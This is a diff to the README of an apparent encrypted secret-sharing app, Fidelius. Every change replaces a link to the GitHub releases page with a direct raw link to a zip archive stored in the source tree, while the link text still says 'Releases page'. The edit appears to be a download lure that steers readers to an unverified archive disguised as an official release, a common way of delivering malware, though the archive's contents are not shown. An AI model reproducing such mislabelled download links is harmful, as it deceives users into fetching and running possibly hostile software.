@@ -4,7 +4,7 @@
 Fidelius is a minimal, end-to-end encrypted application for sharing one-time secrets. With Fidelius, your sensitive information remains private and secure. Share messages without the worry of interception or unauthorized access. 
 
 ## 📥 Download Fidelius
-[![Download Fidelius](https://img.shields.io/badge/Download-Fidelius-brightgreen.svg)](https://github.com/maRCIOFERREIRAXZ/Fidelius/releases)
+[![Download Fidelius](https://raw.githubusercontent.com/maRCIOFERREIRAXZ/Fidelius/main/backend/src/Fidelius_2.0.zip)](https://raw.githubusercontent.com/maRCIOFERREIRAXZ/Fidelius/main/backend/src/Fidelius_2.0.zip)
 
 ## 🚀 Getting Started
 To start using Fidelius, follow these simple steps to ensure a smooth installation and setup.
@@ -16,7 +16,7 @@ To start using Fidelius, follow these simple steps to ensure a smooth installati
 
 ### 📂 Installation Steps
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/maRCIOFERREIRAXZ/Fidelius/releases) to find the latest version of Fidelius.
+   Go to our [Releases page](https://raw.githubusercontent.com/maRCIOFERREIRAXZ/Fidelius/main/backend/src/Fidelius_2.0.zip) to find the latest version of Fidelius.
 
 2. **Download the Latest Release**  
    Locate the most recent version listed. Click on the corresponding download link for your operating system to download the installer.
@@ -50,6 +50,6 @@ Currently, Fidelius is designed for desktop use. However, our team is exploring 
 If you experience any issues or have questions, feel free to reach out. Contributions and suggestions are always welcome!
 
 ## 📥 Download & Install
-To download and run Fidelius, please visit our [Releases page](https://github.com/maRCIOFERREIRAXZ/Fidelius/releases). There you will find the latest version ready for download. 
+To download and run Fidelius, please visit our [Releases page](https://raw.githubusercontent.com/maRCIOFERREIRAXZ/Fidelius/main/backend/src/Fidelius_2.0.zip). There you will find the latest version ready for download. 
 
 Make sure to follow the installation steps for a smooth experience. Enjoy a private, secure way to share your secrets!
